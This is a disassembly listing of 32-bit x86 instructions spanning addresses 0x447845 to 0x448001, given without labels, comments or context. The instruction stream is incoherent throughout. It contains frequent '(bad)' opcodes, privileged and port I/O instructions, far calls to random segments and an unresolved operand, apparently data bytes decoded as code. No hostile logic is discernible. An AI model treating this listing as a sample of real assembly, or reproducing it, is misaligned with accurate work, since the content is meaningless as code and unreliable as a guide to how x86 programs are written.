  447845:	outs   dx,DWORD PTR ds:[esi]
  447846:	pop    DWORD PTR [esi-0x4f]
  447849:	daa    
  44784a:	xchg   edi,ebp
  44784c:	out    dx,al
  44784d:	pop    ebx
  44784e:	enter  0x4b67,0x95
  447852:	jg     0x447895
  447854:	dec    BYTE PTR [ebx]
  447856:	loopne 0x447845
  447858:	xchg   ebx,eax
  447859:	add    eax,eax
  44785b:	sbb    eax,DWORD PTR [edx+0x53389afc]
  447861:	iret   
  447862:	retf   0x18a4
  447865:	ja     0x44789d
  447867:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  447868:	(bad)  
  447869:	loope  0x447808
  44786b:	leave  
  44786c:	sbb    dh,al
  44786e:	sbb    ch,ah
  447870:	xchg   ebp,eax
  447871:	test   eax,0x3c5e929a
  447876:	pop    ds
  447877:	adc    DWORD PTR [edx-0x46587f44],edx
  44787d:	sub    eax,0xbe89df32
  447882:	sbb    al,0xef
  447884:	lods   eax,DWORD PTR ds:[esi]
  447885:	push   es
  447886:	fidivr DWORD PTR ds:0x2c81d532
  44788c:	push   es
  44788d:	push   ebx
  44788e:	out    dx,al
  44788f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  447890:	out    dx,al
  447891:	xchg   ebx,eax
  447892:	bswap  ecx
  447894:	sub    ebp,DWORD PTR [eax+0x50b22b06]
  44789a:	test   BYTE PTR [esp+ebx*4-0xe],dl
  44789e:	stos   DWORD PTR es:[edi],eax
  44789f:	int3   
  4478a0:	xor    DWORD PTR [edx],ecx
  4478a2:	push   ecx
  4478a3:	sbb    al,0xfe
  4478a5:	icebp  
  4478a6:	cli    
  4478a7:	dec    esi
  4478a8:	cmp    edi,DWORD PTR fs:[ecx-0x28]
  4478ac:	push   esi
  4478ad:	stc    
  4478ae:	or     ah,BYTE PTR [eax+esi*4]
  4478b1:	inc    ebp
  4478b2:	lds    esp,FWORD PTR [edx+0x476dd185]
  4478b8:	push   ecx
  4478b9:	mov    DWORD PTR [eax+0x4f],ebx
  4478bc:	adc    cl,BYTE PTR [ebx]
  4478be:	dec    ecx
  4478bf:	shl    cl,cl
  4478c1:	and    DWORD PTR [ebp+ecx*2+0x69a4422],edi
  4478c8:	and    BYTE PTR [edi+0x7d2dd8fb],dl
  4478ce:	stc    
  4478cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4478d0:	ja     0x4478b6
  4478d2:	jge    0x44788c
  4478d4:	aad    0xab
  4478d6:	dec    esp
  4478d7:	fwait
  4478d8:	add    ch,BYTE PTR [edx+ebx*4+0x776ab3d7]
  4478df:	jle    0x447872
  4478e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4478e2:	inc    edx
  4478e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4478e4:	sub    edx,DWORD PTR [ecx+0x1]
  4478e7:	loope  0x4478f0
  4478e9:	ret    
  4478ea:	cvtps2pd xmm6,QWORD PTR [edx+0x4e1497a9]
  4478f1:	or     BYTE PTR [esi],dh
  4478f3:	jp     0x447940
  4478f5:	or     ch,bh
  4478f7:	rol    ecx,1
  4478f9:	call   0xd3686028
  4478fe:	ret    0xb270
  447901:	pop    ss
  447902:	bound  edx,QWORD PTR [ecx]
  447904:	scas   eax,DWORD PTR es:[edi]
  447905:	gs test eax,0x40532438
  44790b:	cmp    DWORD PTR [edx-0x119b7750],esi
  447911:	adc    ah,dl
  447913:	dec    edx
  447914:	mov    dl,0x61
  447916:	enter  0x7359,0x2a
  44791a:	int    0x76
  44791c:	ror    BYTE PTR [ebx],cl
  44791e:	inc    ebp
  44791f:	xor    ecx,ebp
  447921:	mov    al,0x79
  447923:	add    ch,dl
  447925:	xchg   BYTE PTR [edx-0x31ce86f1],ah
  44792b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44792c:	or     esi,DWORD PTR [eax]
  44792e:	push   ss
  44792f:	jmp    0xb10fcba1
  447934:	cwde   
  447935:	jnp    0x44795d
  447937:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  447938:	int    0x2e
  44793a:	adc    ebp,edi
  44793c:	bound  eax,QWORD PTR [ecx-0x75]
  44793f:	sub    eax,0xdcd720b2
  447944:	push   ss
  447945:	mov    edx,0xb73f53b
  44794a:	(bad)  
  44794b:	sbb    dl,dl
  44794d:	jmp    0x4479ac
  44794f:	dec    ebp
  447950:	int3   
  447951:	setp   BYTE PTR [edx-0x1d908959]
  447958:	xlat   BYTE PTR ds:[ebx]
  447959:	test   BYTE PTR [esi-0x59],bh
  44795c:	icebp  
  44795d:	mov    ebx,0x91706733
  447962:	ret    0xb2cd
  447965:	add    al,0xaa
  447967:	sar    BYTE PTR [edx+0x4f],1
  44796a:	js     0x447916
  44796c:	dec    ebp
  44796d:	sbb    al,0xc8
  44796f:	sbb    BYTE PTR [edi-0x2aa04cf5],dl
  447975:	sbb    DWORD PTR [esi],esp
  447977:	in     eax,dx
  447978:	scas   eax,DWORD PTR es:[edi]
  447979:	adc    ecx,edx
  44797b:	test   al,0x83
  44797d:	jns    0x44793b
  44797f:	retf   
  447980:	xchg   edx,eax
  447981:	mov    ecx,0xb8bd227
  447986:	xchg   ecx,eax
  447987:	cmc    
  447988:	addr16 mov ebx,0xfb14c488
  44798e:	call   0x8fd1:0x11956dd3
  447995:	jne    0x4479f8
  447997:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  447998:	jbe    0x44796b
  44799a:	pop    es
  44799b:	cdq    
  44799c:	mov    al,ds:0x89e95099
  4479a1:	das    
  4479a2:	pusha  
  4479a3:	pop    edx
  4479a4:	mov    dl,0x70
  4479a6:	push   esp
  4479a7:	(bad)  
  4479a8:	xor    ecx,DWORD PTR [ebx+0x4d]
  4479ab:	or     BYTE PTR [edi+0xa],al
  4479ae:	test   bl,dl
  4479b0:	sar    BYTE PTR [eax+0x4add5c97],1
  4479b6:	ds sub eax,0xaf6ee356
  4479bc:	mov    dl,0xf1
  4479be:	mov    al,BYTE PTR [esi-0x11]
  4479c1:	or     dh,BYTE PTR [edx+0x3c0b0bd5]
  4479c7:	arpl   WORD PTR [eax-0x3b],bx
  4479ca:	adc    al,0xab
  4479cc:	jae    0x447977
  4479ce:	call   0x3eed:0x991fe08b
  4479d5:	lea    ebp,[edx-0x6594ec67]
  4479db:	adc    DWORD PTR [esp+ecx*2+0x35805066],ebp
  4479e2:	call   0xc3df:0x2db52377
  4479e9:	inc    edx
  4479ea:	push   eax
  4479eb:	scas   al,BYTE PTR es:[edi]
  4479ec:	(bad)  
  4479ed:	mov    eax,0x5a3c4bda
  4479f2:	xchg   ecx,eax
  4479f3:	(bad)  
  4479f4:	mov    eax,0xd7a76aaa
  4479f9:	push   cs
  4479fa:	retf   0x6706
  4479fd:	rcr    BYTE PTR [ecx-0x2e2b3edb],1
  447a03:	nop
  447a04:	dec    esi
  447a05:	retf   
  447a06:	out    0x12,eax
  447a08:	je     0x447a15
  447a0a:	xchg   ebx,eax
  447a0b:	xchg   ebp,eax
  447a0c:	(bad)  [ecx+0x3d]
  447a0f:	push   edi
  447a10:	xchg   edx,eax
  447a11:	jle    0x447a02
  447a13:	int3   
  447a14:	mov    cl,0x6
  447a16:	mov    WORD PTR [ebp+0x7e],ds
  447a19:	inc    edi
  447a1a:	daa    
  447a1b:	daa    
  447a1c:	inc    ecx
  447a1d:	cmp    bh,BYTE PTR [esi-0x64aad059]
  447a23:	in     eax,dx
  447a24:	je     0x447a9a
  447a26:	xchg   DWORD PTR [ebx-0x43],eax
  447a29:	call   0xbadf4cd
  447a2e:	loop   0x447a7d
  447a30:	es shl esi,cl
  447a33:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  447a34:	jb     0x4479ed
  447a36:	and    esp,ebx
  447a38:	mov    esi,0x8890dc41
  447a3d:	mov    bh,BYTE PTR [ebp+0x1ffb428]
  447a43:	daa    
  447a44:	mov    eax,ds:0x16398039
  447a49:	adc    eax,0xbcf1a07
  447a4e:	inc    ebp
  447a4f:	fwait
  447a50:	dec    ecx
  447a51:	pop    ebp
  447a52:	dec    ecx
  447a53:	and    BYTE PTR [edx-0x237a8421],dh
  447a59:	inc    ebp
  447a5a:	xor    al,0x4e
  447a5c:	lahf   
  447a5d:	or     edx,DWORD PTR [ecx-0x6]
  447a60:	mov    ah,ah
  447a62:	or     DWORD PTR [edi-0x1915ef93],edx
  447a68:	loop   0x447a72
  447a6a:	push   cs
  447a6b:	aaa    
  447a6c:	mov    dl,0xe3
  447a6e:	mov    ch,BYTE PTR [ebx]
  447a70:	mov    esi,0x4406ef42
  447a75:	or     esp,DWORD PTR [esi+0x38dbcdb9]
  447a7b:	pop    esi
  447a7d:	fs popf 
  447a7f:	and    esp,DWORD PTR [ebp+0x1103e4d8]
  447a85:	sub    DWORD PTR [ecx],0x88b18ca7
  447a8b:	cmp    DWORD PTR [esi],0xb2482f38
  447a91:	xchg   esp,eax
  447a92:	jns    0x447ae9
  447a94:	es jg  0x447a58
  447a97:	fist   WORD PTR [ebx+0xb166d0b]
  447a9d:	inc    edx
  447a9e:	sti    
  447a9f:	dec    edi
  447aa0:	mov    ebp,0x15db9a3a
  447aa5:	loopne 0x447ae0
  447aa7:	sub    ah,BYTE PTR [ebp+0x14]
  447aaa:	inc    ecx
  447aab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  447aac:	lea    eax,[ebx+0x599d94a6]
  447ab2:	(bad)  
  447ab4:	mov    ebp,0x6036462e
  447ab9:	imul   ebx,eax,0x23
  447abc:	ror    ebp,1
  447abe:	pushf  
  447abf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  447ac0:	icebp  
  447ac1:	pop    ebp
  447ac2:	or     ch,BYTE PTR [edi+esi*8-0x4dce449a]
  447ac9:	ins    BYTE PTR es:[edi],dx
  447aca:	loopne 0x447a71
  447acc:	sbb    eax,0xbc8d8e23
  447ad1:	or     esp,DWORD PTR [edi+edx*1+0xdf3f22c]
  447ad8:	and    eax,DWORD PTR [esi-0x74]
  447adb:	or     dh,bl
  447add:	(bad)  
  447ade:	call   0x37c4:0xb9f1f957
  447ae5:	add    al,0x94
  447ae7:	inc    edi
  447ae8:	test   DWORD PTR [edi],eax
  447aea:	sbb    cl,BYTE PTR [edi+0x67be2b71]
  447af0:	mov    dl,0xf6
  447af2:	pop    ss
  447af3:	or     BYTE PTR [edi+0x3cbb37c4],0xb
  447afa:	stos   BYTE PTR es:[edi],al
  447afb:	fsub   DWORD PTR [edi]
  447afd:	mov    esp,0x7149e8d
  447b02:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  447b03:	(bad)  
  447b04:	icebp  
  447b05:	mov    edi,DWORD PTR [esp+esi*2+0x57481300]
  447b0c:	cld    
  447b0d:	or     ebx,DWORD PTR [edi+0x68]
  447b10:	and    DWORD PTR [edi-0x14cd788d],eax
  447b16:	call   0x5800:0x335b0b50
  447b1d:	push   esp
  447b1e:	and    DWORD PTR [edi+0x6dc28aff],0x70
  447b25:	mov    ds:0xc4b23b54,eax
  447b2a:	jae    0x447b13
  447b2c:	xor    DWORD PTR [eax+eiz*8],edx
  447b2f:	jge    0x447b85
  447b31:	xor    eax,0xfc8c7553
  447b36:	mov    dh,0x5e
  447b38:	mov    esp,0x6d73eb05
  447b3d:	push   esp
  447b3e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  447b40:	jecxz  0x447b29
  447b42:	pop    es
  447b43:	sbb    BYTE PTR gs:[eax+0x74],bh
  447b47:	push   ebp
  447b48:	inc    eax
  447b49:	or     bl,BYTE PTR [edx-0x714399c8]
  447b4f:	cwde   
  447b50:	or     dh,BYTE PTR [edx]
  447b52:	leave  
  447b53:	call   0x43cd:0xf990d14
  447b5a:	stos   DWORD PTR es:[edi],eax
  447b5b:	lds    edx,FWORD PTR [ebx+0x4b]
  447b5e:	loop   0x447bd0
  447b60:	dec    edx
  447b61:	fisttp WORD PTR ds:0x1c24b2b9
  447b67:	inc    edx
  447b68:	iret   
  447b69:	sbb    edi,DWORD PTR [ebx+ebp*2+0x658d0b69]
  447b70:	ins    DWORD PTR es:[edi],dx
  447b71:	cmc    
  447b72:	in     eax,0xac
  447b74:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  447b75:	ret    0x3488
  447b78:	mov    bh,0x5a
  447b7a:	test   DWORD PTR [edx],ecx
  447b7c:	repz add edx,edx
  447b7f:	add    BYTE PTR [ebp+edx*2+0x63],bh
  447b83:	test   DWORD PTR [edx-0x38],ebp
  447b86:	xlat   BYTE PTR ds:[ebx]
  447b87:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  447b88:	push   ss
  447b89:	adc    BYTE PTR [edi],ah
  447b8b:	(bad)  
  447b8c:	pushf  
  447b8d:	outs   dx,DWORD PTR ds:[esi]
  447b8e:	je     0x447b36
  447b90:	mov    cl,0xd0
  447b92:	retf   
  447b93:	ins    BYTE PTR es:[edi],dx
  447b94:	mov    ebx,0x8027b769
  447b99:	sbb    cl,BYTE PTR ds:0x60b6b5a9
  447b9f:	pop    ebx
  447ba0:	mov    dl,0xc8
  447ba2:	shl    DWORD PTR [edi-0x67],cl
  447ba5:	bound  esi,QWORD PTR [ebp+0x265dd7c0]
  447bab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  447bac:	loop   0x447b47
  447bae:	in     al,dx
  447baf:	icebp  
  447bb0:	ds pushf 
  447bb2:	ins    BYTE PTR es:[edi],dx
  447bb3:	xor    ch,BYTE PTR [edi-0x4d39a209]
  447bb9:	loop   0x447b94
  447bbb:	and    al,0x55
  447bbd:	enter  0xa648,0x24
  447bc1:	sbb    BYTE PTR [ebx+0x45df11d0],cl
  447bc7:	(bad)  
  447bc8:	push   edx
  447bc9:	(bad)  
  447bca:	cmp    al,0x87
  447bcc:	xor    BYTE PTR [eax-0xb107366],dl
  447bd2:	adc    DWORD PTR [esi],ebx
  447bd4:	mov    edi,0x80a2246e
  447bd9:	jle    0x447b7f
  447bdb:	mov    BYTE PTR [edx-0x9170f75],bl
  447be1:	and    DWORD PTR [edx-0x2f1914d5],ebx
  447be7:	mov    esi,0xa77375bb
  447bec:	ins    DWORD PTR es:[edi],dx
  447bed:	mov    BYTE PTR ds:0x94162da8,dl
  447bf3:	fidiv  DWORD PTR [edx-0x49d16e23]
  447bf9:	fucomi st,st(1)
  447bfb:	pop    es
  447bfc:	retf   
  447bfd:	push   edi
  447bfe:	fist   WORD PTR [ebx+0x6be11ab5]
  447c04:	cmp    DWORD PTR [ebx+0x587399a1],ecx
  447c0a:	xchg   DWORD PTR [ebx],ebp
  447c0c:	cli    
  447c0d:	jmp    0x447c69
  447c0f:	retf   
  447c10:	sbb    al,0xda
  447c12:	out    0x7c,eax
  447c14:	int    0xc
  447c16:	pop    ds
  447c17:	adc    ch,dh
  447c19:	scas   eax,DWORD PTR es:[edi]
  447c1a:	lock daa 
  447c1c:	jb     0x447c9c
  447c1e:	dec    edi
  447c1f:	or     BYTE PTR [ebx+edi*4+0x2bdf3bb5],bh
  447c26:	outs   dx,BYTE PTR ds:[esi]
  447c27:	lahf   
  447c28:	add    DWORD PTR [edi-0x5],ebp
  447c2b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  447c2c:	out    dx,eax
  447c2d:	xlat   BYTE PTR ds:[ebx]
  447c2e:	pop    esi
  447c2f:	add    al,0x2a
  447c31:	add    DWORD PTR ds:0x1abb2bf,0xffffff82
  447c38:	cs mov edi,0x52701b7
  447c3e:	fisttp WORD PTR [ebp-0x4b85b0f0]
  447c44:	jecxz  0x447c50
  447c46:	loope  0x447ca0
  447c48:	lods   eax,DWORD PTR ds:[esi]
  447c49:	jmp    0x447bf5
  447c4b:	cli    
  447c4c:	or     BYTE PTR [eax+0x3f7f1136],cl
  447c52:	bound  ebx,QWORD PTR [ebp+0xc]
  447c55:	dec    ebx
  447c56:	cmp    DWORD PTR [ebx-0x3f3ff4e7],0x7
  447c5d:	or     BYTE PTR [ecx],0xd4
  447c60:	out    0x37,eax
  447c62:	test   DWORD PTR [esi-0x5765dfba],ecx
  447c68:	xlat   BYTE PTR ds:[ebx]
  447c69:	xchg   ebx,eax
  447c6a:	xor    eax,0xdb0b6304
  447c6f:	jmp    ebp
  447c71:	sub    BYTE PTR [esp+edx*8+0x31],ah
  447c75:	sbb    esp,esp
  447c77:	cmp    BYTE PTR [edx+0x615170a2],dh
  447c7d:	add    DWORD PTR [edi],ebp
  447c7f:	sub    eax,0xb8d70b1d
  447c84:	xor    bl,0xba
  447c87:	inc    edi
  447c88:	mov    esp,0x2fa89a4f
  447c8d:	in     al,0xe8
  447c8f:	inc    esi
  447c90:	xor    dh,BYTE PTR [ebx-0x5e8358a3]
  447c96:	push   esi
  447c97:	cmc    
  447c98:	jo     0x447c5a
  447c9a:	scas   eax,DWORD PTR es:[edi]
  447c9b:	or     DWORD PTR [edx+0x19be8c9c],esi
  447ca1:	mov    esp,0xb76fd14
  447ca6:	jmp    0x581415b
  447cab:	xchg   DWORD PTR [ebx+0x33],esp
  447cae:	call   0x5e91:0x9ab44af
  447cb5:	mul    DWORD PTR gs:[edi+0x5754205a]
  447cbc:	into   
  447cbd:	fwait
  447cbe:	mov    ch,0xd8
  447cc0:	mov    dl,0x3f
  447cc2:	fisub  DWORD PTR [ebx-0x485402ba]
  447cc8:	sbb    eax,0x8817c40b
  447ccd:	mov    al,ds:0xe1b8e2bf
  447cd2:	je     0x447c7d
  447cd4:	mov    dl,0x37
  447cd6:	fs jo  0x447cea
  447cd9:	inc    ebx
  447cda:	mov    eax,DWORD PTR [ebp+0x7]
  447cdd:	or     al,0x21
  447cdf:	iret   
  447ce0:	enter  0x7e6d,0xb7
  447ce4:	mov    WORD PTR [edi+0x71],?
  447ce7:	jb     0x447c99
  447ce9:	xchg   ebp,eax
  447cea:	lea    ebx,[edi+0x7f]
  447ced:	pop    eax
  447cee:	xchg   edi,eax
  447cef:	out    0x5a,eax
  447cf1:	aaa    
  447cf2:	sub    DWORD PTR [ecx-0x5f1263d6],esi
  447cf8:	cmp    edx,ebx
  447cfa:	pushf  
  447cfb:	cs mov ch,0x2c
  447cfe:	adc    eax,0x799b6da7
  447d03:	mov    ds:0x875b1eb2,eax
  447d08:	and    edx,DWORD PTR [edi]
  447d0a:	jle    0x447d83
  447d0c:	jge    0x447d3e
  447d0e:	and    eax,0x28c7b2ec
  447d13:	mov    ah,BYTE PTR [edx-0x4d386655]
  447d19:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  447d1a:	ret    0x7354
  447d1d:	pop    edi
  447d1e:	mov    esp,0x54089010
  447d23:	xchg   esp,eax
  447d24:	jmp    0x7ac5695e
  447d29:	and    cl,BYTE PTR [ebp-0x54]
  447d2c:	dec    bl
  447d2e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  447d2f:	sbb    DWORD PTR [edi+0xf5e9a90],0xad0f590e
  447d39:	or     ebp,DWORD PTR [eax-0x14a1e5a]
  447d3f:	mov    edx,0x6c9d358d
  447d44:	xchg   edi,eax
  447d45:	ficom  WORD PTR [esi]
  447d47:	jnp    0x447cf5
  447d49:	jmp    0x447d50
  447d4b:	mov    ebp,DWORD PTR [ecx-0x1]
  447d4e:	jecxz  0x447db7
  447d50:	nop
  447d51:	(bad)  
  447d52:	out    0x84,eax
  447d54:	push   es
  447d55:	and    BYTE PTR [ebx+0x334a14a2],bl
  447d5b:	mov    ebp,0x78aabb83
  447d60:	jp     0x447d7a
  447d62:	mov    al,0x23
  447d64:	and    ecx,DWORD PTR [ebx]
  447d66:	jl     0x447db9
  447d68:	jbe    0x447cfa
  447d6a:	(bad)  
  447d6b:	jnp    0x447d1f
  447d6d:	mov    dl,0x15
  447d6f:	sub    DWORD PTR ds:0x73e6a81a,esp
  447d75:	or     ecx,DWORD PTR [ebx+edi*4+0x1a79ada2]
  447d7c:	xchg   esi,eax
  447d7d:	lea    eax,[esi+0x5a2a5024]
  447d83:	neg    eax
  447d85:	xchg   ebx,eax
  447d86:	aas    
  447d87:	sub    BYTE PTR [ecx],ah
  447d89:	add    eax,0x52d1dd7d
  447d8e:	jp     0x447dbe
  447d90:	push   cs
  447d91:	(bad)  
  447d92:	fiadd  DWORD PTR ds:0x2e95ce96
  447d98:	(bad)  
  447d99:	mov    esi,esi
  447d9b:	arpl   ax,dx
  447d9d:	ror    BYTE PTR [esi-0x7e0c3e41],0xa8
  447da4:	scas   al,BYTE PTR es:[edi]
  447da5:	xchg   DWORD PTR [ebx+0x72be7149],edx
  447dab:	aad    0x4a
  447dad:	sub    edx,edi
  447daf:	ror    DWORD PTR [edi-0x60daf885],1
  447db5:	cld    
  447db6:	mov    al,ds:0x284b5b33
  447dbb:	jno    0x447dae
  447dbd:	or     eax,DWORD PTR [eax-0x6b]
  447dc0:	ins    BYTE PTR es:[edi],dx
  447dc1:	and    DWORD PTR [ebp+0x74],esi
  447dc4:	sar    DWORD PTR [eax-0x413ddf66],0xd6
  447dcb:	jnp    0x447d83
  447dcd:	cmp    BYTE PTR [esi-0x7aa93a57],dl
  447dd3:	stc    
  447dd4:	pop    ebp
  447dd5:	(bad)  
  447dd6:	cli    
  447dd7:	push   edx
  447dd8:	(bad)  
  447dd9:	stos   DWORD PTR es:[edi],eax
  447dda:	sbb    dh,ah
  447ddc:	lods   eax,DWORD PTR ds:[esi]
  447ddd:	mov    al,ds:0x8fb26a98
  447de2:	inc    DWORD PTR [ecx+0xd]
  447de5:	push   edi
  447de6:	push   0xdaa69da7
  447deb:	cdq    
  447dec:	fnstenv [ebp+0x6cbd479d]
  447df2:	push   ss
  447df3:	out    0x3b,al
  447df5:	jmp    0x447e27
  447df7:	cmp    eax,0xa7585b47
  447dfc:	and    dl,BYTE PTR [esi-0x4e]
  447dff:	xor    eax,0x849d324f
  447e04:	mov    dl,0x77
  447e06:	inc    ebp
  447e07:	ins    BYTE PTR es:[edi],dx
  447e08:	mov    edi,0x302fe66
  447e0d:	or     BYTE PTR [esi],dl
  447e0f:	jae    0x447dd9
  447e11:	ror    BYTE PTR [eax+ecx*8+0x2a],cl
  447e15:	push   0xbfb222ba
  447e1a:	sub    eax,0x826ab1e0
  447e1f:	sub    BYTE PTR [eax],al
  447e21:	in     eax,0x33
  447e23:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  447e24:	xchg   ebp,eax
  447e25:	xchg   ecx,eax
  447e26:	xor    dh,BYTE PTR [ecx+0x1181f2d2]
  447e2c:	mov    dl,0xe8
  447e2e:	mov    ch,0xeb
  447e30:	xchg   BYTE PTR [esi+0x1d363a4a],ah
  447e36:	fisubr DWORD PTR [ecx]
  447e38:	xchg   esp,eax
  447e39:	or     dh,BYTE PTR [ebp+0x58]
  447e3c:	inc    ebp
  447e3d:	xor    ebp,DWORD PTR [eax+0x74c48447]
  447e43:	imul   BYTE PTR [ebp+0x76c70a0f]
  447e49:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  447e4a:	inc    esp
  447e4b:	ds jb  0x447e58
  447e4e:	icebp  
  447e4f:	(bad)
  447e53:	repz pop ecx
  447e55:	xlat   BYTE PTR ds:[ebx]
  447e56:	imul   edi,DWORD PTR [eax+0x7e],0xffffffc0
  447e5a:	mov    dh,0x3d
  447e5c:	mov    edx,0x83a7a254
  447e61:	push   cs
  447e62:	xchg   edi,eax
  447e63:	cmp    DWORD PTR [edx+0x6d],edi
  447e66:	repz cdq 
  447e68:	jmp    0x2d20:0xf0a66a74
  447e6f:	inc    esi
  447e70:	xor    al,0x10
  447e72:	push   0x9acfa64b
  447e77:	xchg   edx,eax
  447e78:	fild   DWORD PTR [edi]
  447e7a:	mov    ds:0xc886c9e9,al
  447e7f:	mov    al,ds:0x2f4d1c74
  447e84:	sub    BYTE PTR [ebx+0x48f82167],cl
  447e8a:	call   0xa0e9:0x59d500ac
  447e91:	bound  edi,QWORD PTR [edi+eiz*4-0x76]
  447e95:	(bad)  
  447e96:	jb     0x447e1a
  447e98:	lods   eax,DWORD PTR ds:[esi]
  447e99:	xchg   BYTE PTR [eax+0x41eab5ad],ch
  447e9f:	pop    es
  447ea0:	add    al,0xe6
  447ea2:	mov    al,al
  447ea4:	sub    edx,esp
  447ea6:	lahf   
  447ea7:	mov    ecx,0x595f468a
  447eac:	mov    dl,0xa8
  447eae:	arpl   WORD PTR [esi],bp
  447eb0:	loope  0x447e3a
  447eb2:	aaa    
  447eb3:	xor    BYTE PTR [ebp-0x6b1d8488],0x60
  447eba:	cli    
  447ebb:	(bad)  
  447ebc:	mov    edx,0xaea71ae7
  447ec1:	mov    cl,0x2d
  447ec3:	mov    ch,0x8b
  447ec5:	push   eax
  447ec6:	aam    0xd0
  447ec8:	mov    bl,0xc1
  447eca:	sti    
  447ecb:	inc    ecx
  447ecc:	jp     0x447f2d
  447ece:	aaa    
  447ecf:	dec    ebx
  447ed0:	ret    0xc94e
  447ed3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  447ed4:	sub    DWORD PTR [esi+0xd],esi
  447ed7:	lock je 0x447ebe
  447eda:	xlat   BYTE PTR ds:[ebx]
  447edb:	(bad)  
  447edc:	mov    cl,dl
  447ede:	call   0xd3c9:0x6fa5e0c4
  447ee5:	arpl   WORD PTR ds:0x11cba4b1,dx
  447eeb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  447eec:	into   
  447eed:	add    DWORD PTR [edi-0x4a],esi
  447ef0:	fdivr  st,st(7)
  447ef2:	pop    esp
  447ef3:	push   0xffffffb2
  447ef5:	mov    dl,0x1e
  447ef7:	inc    esp
  447ef8:	jns    0x447f45
  447efa:	sbb    cl,BYTE PTR ds:0x3cf70b68
  447f00:	mov    esi,0xdaa2389e
  447f05:	mov    bh,0x9d
  447f07:	mov    dh,0xbc
  447f09:	xchg   bh,ch
  447f0b:	and    BYTE PTR [edx-0x4a29cc32],dl
  447f11:	add    al,0xbc
  447f13:	sti    
  447f14:	and    DWORD PTR [edx-0x6],ebp
  447f17:	mov    cl,0x59
  447f19:	dec    edx
  447f1a:	push   eax
  447f1b:	xor    DWORD PTR [edx-0x345129e0],0x53
  447f22:	jae    0x447f19
  447f24:	fnstenv [ecx]
  447f26:	xor    ah,BYTE PTR [ebx-0xae712d3]
  447f2c:	add    cl,BYTE PTR [ebx]
  447f2e:	dec    ebp
  447f2f:	jo     0x447eda
  447f31:	pop    edi
  447f32:	xchg   esp,eax
  447f33:	mov    BYTE PTR [edx+0x57a4759f],dh
  447f39:	ja     0x447f9f
  447f3b:	adc    esi,ebx
  447f3d:	or     eax,ebp
  447f3f:	rcr    bh,cl
  447f41:	mov    cl,0xcf
  447f43:	hlt    
  447f44:	je     0x447fb0
  447f46:	jl     0x447f8d
  447f48:	mov    dl,0x68
  447f4a:	dec    ecx
  447f4b:	mov    esp,0x8b86ac16
  447f50:	adc    ecx,DWORD PTR [ebx]
  447f52:	add    cl,BYTE PTR [ebp+0xde6c37c]
  447f58:	fisubr WORD PTR [ebp-0x11]
  447f5b:	dec    edi
  447f5c:	mov    dl,0x84
  447f5e:	aas    
  447f5f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  447f60:	ja     0x447f95
  447f62:	sub    eax,0x870b00f5
  447f67:	gs jl  0x447f69
  447f6a:	xchg   esi,eax
  447f6b:	sahf   
  447f6c:	mov    edi,0xb2ae6485
  447f71:	push   edx
  447f72:	icebp  
  447f73:	shl    edi,cl
  447f75:	(bad)  
  447f76:	mov    ecx,0x330bf0f3
  447f7b:	out    0x78,eax
  447f7d:	scas   eax,DWORD PTR es:[edi]
  447f7e:	es scas eax,DWORD PTR es:[edi]
  447f80:	imul   edx,DWORD PTR [ebx],0x78c5369a
  447f86:	adc    eax,0x47e3e0c3
  447f8b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  447f8c:	int    0x7d
  447f8e:	adc    edi,ebp
  447f90:	or     eax,0xb2599017
  447f95:	and    eax,0xc856e534
  447f9a:	sub    DWORD PTR ds:[edx],ebp
  447f9d:	or     BYTE PTR [ecx],dh
  447f9f:	outs   dx,BYTE PTR ds:[esi]
  447fa0:	test   BYTE PTR [ebx-0x73b9070d],ch
  447fa6:	div    DWORD PTR [edi+0x407fbc52]
  447fac:	mov    dl,0x38
  447fae:	xor    al,0x96
  447fb0:	test   al,0x74
  447fb2:	out    0x50,eax
  447fb4:	fidivr WORD PTR [edx-0x2f]
  447fb7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  447fb8:	leave  
  447fb9:	lds    esp,FWORD PTR ds:0xb6565d72
  447fbf:	xlat   BYTE PTR ds:[ebx]
  447fc0:	mov    ah,0x36
  447fc2:	sahf   
  447fc3:	cld    
  447fc4:	or     al,0xc4
  447fc6:	pop    ecx
  447fc7:	retf   
  447fc8:	xor    bh,bh
  447fca:	stos   DWORD PTR es:[edi],eax
  447fcb:	lock lds ecx,FWORD PTR [edx]
  447fce:	dec    ebp
  447fcf:	idiv   BYTE PTR [edi]
  447fd1:	call   esi
  447fd3:	jae    0x448032
  447fd5:	out    dx,eax
  447fd6:	mov    dh,0x6a
  447fd8:	mov    bl,0x24
  447fda:	push   ebx
  447fdb:	pop    edx
  447fdc:	inc    eax
  447fdd:	pop    eax
  447fde:	lahf   
  447fdf:	cmp    eax,0xa75fb042
  447fe4:	lea    ebx,[ebx+0x569ac3ba]
  447fea:	bound  eax,QWORD PTR ds:0x523355a4
  447ff0:	mov    dl,0x7c
  447ff2:	repz push 0xa7802c97
  447ff8:	jg     0x44800a
  447ffa:	rcr    BYTE PTR [esp+eiz*2-0x4e28470d],cl
  448001:	out    dx,al
